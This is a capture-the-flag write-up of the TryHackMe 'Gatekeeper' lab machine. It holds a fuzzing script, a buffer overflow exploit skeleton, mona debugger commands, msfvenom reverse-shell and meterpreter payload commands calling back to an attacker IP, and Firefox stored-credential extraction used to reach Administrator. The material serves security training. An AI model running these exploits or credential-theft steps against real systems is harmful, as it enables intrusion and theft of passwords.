---
tags:
  - bufferoverflow
  - firefox_decrypt
---
# THM: Gatekeeper

***Overview**: Gatekeeper is a Medium Difficulty machine on Tryhackme, that exploits Remote bufferoverflow vulnerability in a server to obtain compromised foothold on the machine. It then decrypts stored firefox credentials to retrieve Administrator credentials and gain System access on the machine.*

- So first we scan for open ports on the target

![](assets/GateKeeper_assets/Pasted%20image%2020231203100123.png)

- then we scan for the services on those open ports

```shell
nmap -sV -sC -p$ports 10.10.121.71 -v
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-03 04:01 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:01
Completed NSE at 04:01, 0.00s elapsed
Initiating NSE at 04:01
Completed NSE at 04:01, 0.00s elapsed
Initiating NSE at 04:01
Completed NSE at 04:01, 0.00s elapsed
Initiating Ping Scan at 04:01
Scanning 10.10.121.71 [2 ports]
Completed Ping Scan at 04:01, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:01
Completed Parallel DNS resolution of 1 host. at 04:01, 0.03s elapsed
Initiating Connect Scan at 04:01
Scanning 10.10.121.71 [11 ports]
Discovered open port 445/tcp on 10.10.121.71
Discovered open port 135/tcp on 10.10.121.71
Discovered open port 139/tcp on 10.10.121.71
Discovered open port 3389/tcp on 10.10.121.71
Discovered open port 49154/tcp on 10.10.121.71
Discovered open port 49168/tcp on 10.10.121.71
Discovered open port 49153/tcp on 10.10.121.71
Discovered open port 31337/tcp on 10.10.121.71
Discovered open port 49161/tcp on 10.10.121.71
Discovered open port 49152/tcp on 10.10.121.71
Discovered open port 49155/tcp on 10.10.121.71
Completed Connect Scan at 04:01, 0.32s elapsed (11 total ports)
Initiating Service scan at 04:01
Scanning 11 services on 10.10.121.71
Service scan Timing: About 36.36% done; ETC: 04:04 (0:01:38 remaining)
Completed Service scan at 04:04, 160.91s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.121.71.
Initiating NSE at 04:04
Completed NSE at 04:04, 5.93s elapsed
Initiating NSE at 04:04
Completed NSE at 04:04, 1.31s elapsed
Initiating NSE at 04:04
Completed NSE at 04:04, 0.00s elapsed
Nmap scan report for 10.10.121.71
Host is up (0.16s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open                     Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2023-12-03T09:04:10+00:00
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-12-02T08:47:56
| Not valid after:  2024-06-02T08:47:56
| MD5:   98e2:bb84:9712:287d:440d:6617:969c:9582
|_SHA-1: a0b6:b29b:86b6:a363:cd42:5655:a1ab:2916:b16e:89de
|_ssl-date: 2023-12-03T09:04:16+00:00; 0s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
49168/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94%I=7%D=12/3%Time=656C43F4%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-03T04:04:10-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-12-03T09:04:10
|_  start_date: 2023-12-03T08:47:10
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:ff:26:7b:39:4d (unknown)
| Names:
|   GATEKEEPER<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   GATEKEEPER<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>

NSE: Script Post-scanning.
Initiating NSE at 04:04
Completed NSE at 04:04, 0.00s elapsed
Initiating NSE at 04:04
Completed NSE at 04:04, 0.00s elapsed
Initiating NSE at 04:04
Completed NSE at 04:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.11 seconds

```

### SMB

- so we can list the shares on the SMB server and we have one Users

![](assets/GateKeeper_assets/Pasted%20image%2020240102091410.png)

- so we connect to it and view the files in a share

![](assets/GateKeeper_assets/Pasted%20image%2020240102091629.png)

- so we transfer the file to my machine for analysis

## Port 31337

- After the port scan, we notice a unique port 31337, so lets go ahead and look at that
- so we can connect to the service to understand what it does

```shell
nc 10.10.121.71 31337  
```

- so we can see that when we enter our name it returns `Hello <name>!!!`

![](assets/GateKeeper_assets/Pasted%20image%2020231203095232.png)

### Analysis of the gatekeeper.exe

- so after transfering the file, we start our debugger and run the binary

![](assets/GateKeeper_assets/Pasted%20image%2020231203121643.png)

- so what we want to see is if we can break the application by sending random characters
### Fuzzing

- Now we can start sending a bunch of characters (A) using the script

```python
#!/usr/bin/env python3

import socket, time, sys
ip = "192.168.88.132"
port = 31337
timeout = 5

try:
	string = "A" * 100
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
		print("Fuzzing with {} bytes".format(len(string)))
		data_to_send = f"{string}\r\n"
		s.send(data_to_send.encode())
		response = s.recv(1024).decode()
		s.close()
		string += 100 * "A"
		time.sleep(1)
except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)

```

- so after running the script, we can see that the application crashed at 200 bytes, meaning our Offset is in this range of characters. In our debugger, we can see that we have an Access Violation error

![](assets/GateKeeper_assets/Pasted%20image%2020231203133726.png)

![](assets/GateKeeper_assets/Pasted%20image%2020231203133752.png)

### Finding the Offset
- so now we want to find the exact amount of bytes the application crashed
- we run the following to generate 20 bytes of characters, and put it in the payload portion of our script below

```shell
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
```

```python
import socket

ip = "192.168.88.132"
port = 31337

prefix = "gr4y "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- then restart our application and reattach the executable and we run the script

![](assets/GateKeeper_assets/Pasted%20image%2020231203134321.png)

- after that we will use mona to find the offset using the command

```shell
!mona findmsp -distance 200
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203134816.png)

- and from the above, we can see that the offset is 141

### Overwriting the EIP

- so we want to try and see if we can overwrite the Instruction pointer (EIP) now that we know that the offset is 141
- so now we will include the offset in our previous script and then we specify our retn value as BBBB, so our EIP will e overwritten with 4 B's (B is 42 in hex, so it will be 42424242)

![](assets/GateKeeper_assets/Pasted%20image%2020231203134909.png)

- so we restart immunity and reattach and then run our script and as we can see in the Registers pane, that we have overwritten the EIP, so we have full control over the EIP

![](assets/GateKeeper_assets/Pasted%20image%2020231203135116.png)

### Finding Bad Character
- so now we set our working folder in mona so the byte file that will be generated will be placed here

```shell
!mona config -set workingfolder c:\mona\%p
```

- then we can generate an array of bytes, excluding the null byte and it is saved in a file bytearray.txt

```shell
!mona bytearray -b "\x00"
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203140438.png)

- on our own machine we generate a set of bad characters using the script bellow that will be used for comparison

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203135344.png)

- we the place it in the payload parameter of our script

![](assets/GateKeeper_assets/Pasted%20image%2020231203135414.png)

- then we can restart immunity and reattach, then run the script, then we take note of our ESP address

![](assets/GateKeeper_assets/Pasted%20image%2020231203140242.png)

- now we run the command with the ESP address (ours is 009D19E4) to compare with the bytearray file that we generated earlier

```shell
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 009D19E4
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203140528.png)

- and we can see the bad characters as `\x00\x0a`, so now we generate another byte array and specify the new bad character (0a)

```shell
!mona bytearray -b \x00\x0a
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203140851.png)

- then we can paste the values generated (in the bytearray.txt file) in the payload part of our script

![](assets/GateKeeper_assets/Pasted%20image%2020231203140823.png)

- then we restart debugger and run the script, then we note the esp (ours is 00A319E4 ) 
![](assets/GateKeeper_assets/Pasted%20image%2020231203141021.png)

- and we compare again with mona

```shell
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 00A319E4
```

- now we see unmodified meaning there are no more bad char

![](assets/GateKeeper_assets/Pasted%20image%2020231203141131.png)

### Find the Jump Point

- find the jmp point using the mona command

```shell
!mona jmp -r esp -cpb "\x00\x0a"
```

![](assets/GateKeeper_assets/Pasted%20image%2020231203141319.png)

- we can see that we have 2 addresses 0x080414c3 and 0x080416bf, so we can use any one of them
- so we put `\xc3\x14\x04\x08` as the retn value in our script

### Generate Shell code

- now we can generate our reverse shell payload using msfvenom

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.88.129 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

- we paste it in payload portion of our script and set up our  nc listener
### Add NOPS
- we also add some padding for our exploit using

```
"\x90" * 16
```

- now our final script will look like the below

![](assets/GateKeeper_assets/Pasted%20image%2020231203144239.png)

- now when we rerun our exploit (after restarting the gatekeeper.exe), we get a shell on our local machine, meaning our exploit was successful

![](assets/GateKeeper_assets/Pasted%20image%2020231203144307.png)

## Exploit Remotely

- now that we have a working exploit, we will then rerun the exploit remotely, knowing that this gatekeeper service is running on port 31337
- we first generate a new payload specifying our LHOST as our IP address on the network

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.123 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

- and also modify the target IP and port

![](assets/GateKeeper_assets/Pasted%20image%2020231203144700.png)

- now when we run our exploit we get a shell

![](assets/GateKeeper_assets/Pasted%20image%2020231203145012.png)

- now we can view our user flag

![](assets/GateKeeper_assets/Pasted%20image%2020231203145036.png)

## Privilege Escalation

- we notice a user mayor, and when we look at the information for the mayor user, we can see that he is an Administrator

![](assets/GateKeeper_assets/Pasted%20image%2020231203145256.png)
### Switching to Meterpreter shell

- so we generate a new payload and rerun the script

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.80.123 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

![](assets/GateKeeper_assets/Pasted%20image%2020231204052311.png)

- we then migrate to an x64 process

![](assets/GateKeeper_assets/Pasted%20image%2020231204052329.png)
- looking through the system we noticed that firefox was installed so lets see if we have stored credentials
- so we run the firefox_creds moduce in Metasploit

![](assets/GateKeeper_assets/Pasted%20image%2020231204061823.png)

- now we move these files to a single directory and rename then

![](assets/GateKeeper_assets/Pasted%20image%2020231204060453.png)

![](assets/GateKeeper_assets/Pasted%20image%2020231204060522.png)
- now we can decrypt it using the tool [unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles (github.com)](https://github.com/unode/firefox_decrypt) and specify the the directory containing the files

![](assets/GateKeeper_assets/Pasted%20image%2020231204060539.png)

- and we can see that we have retrieved the credentials for the mayor user
- so using RDP we were able to log on with those credentials, and retrieve our root flag

![](assets/GateKeeper_assets/Pasted%20image%2020231204061657.png)
